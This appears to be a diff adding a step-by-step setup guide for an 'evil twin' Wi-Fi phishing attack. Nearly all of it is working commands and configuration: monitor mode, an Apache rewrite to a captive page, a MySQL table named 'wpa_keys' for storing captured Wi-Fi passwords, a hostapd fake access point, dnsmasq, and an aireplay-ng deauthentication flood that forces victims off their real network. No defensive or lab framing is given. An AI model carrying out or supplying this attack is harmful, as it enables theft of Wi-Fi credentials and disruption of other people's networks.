@@ -1,0 +1,89 @@
+run with root>
+
+su or sudo -i
+
+install dnsmasq and hostapd>
+
+apt install dnsmasq hostapd -y
+
+Start monitor mode>
+
+airmon-ng wlan0 Start
+
+make sure your wireless adapter in monitor mode>
+
+iwconfig wlan0mon
+
+setup apache2 rewrite rules>
+
+nano /etc/apache2/sites-enabled/000-default.conf
+
+paste this> 
+
+<Directory "/var/www/html">
+	RewriteEngine On
+	RewriteBase /
+	RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+	RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+	
+	RewriteCond %{REQUEST_FILENAME} !-f
+	RewriteCond %{REQUEST_FILENAME} !-d
+	RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+
+check if your apache2 rewrite module is enabled>
+
+a2enmod rewrite
+
+start service>
+
+service apache2 start
+service mysql start
+
+setup mysql>
+
+mysql -u root -p
+
+create database eviltwin;
+
+use eviltwin;
+
+create user dodgers@localhost identified by 'duck';
+
+grant all privileges on eviltwin.* to 'dodgers'@'localhost';
+
+create table wpa_keys(password1 varchar(32), password2 varchar(32));
+
+show tables;
+
+DON'T close terminal!!
+
+Open new terminal and run with root
+
+type> 
+
+ifconfig wlan0mon up 10.0.0.1 netmask 255.255.255.0
+
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+
+cd /var/www/html/configuration_files
+
+run Forward traffic>
+
+./iptablesRules.sh
+
+Turn on the Fake Access Point
+
+hostapd hostapd.conf
+
+open another terminal with root and type>
+
+cd /var/www/html/configuration_files
+
+start dnsmasq>
+
+dnsmasq -C dnsmasq.conf -d
+
+if you want to down the wifi type
+
+aireplay-ng -deauth 0 -a {bssid wifi} wlan0mon
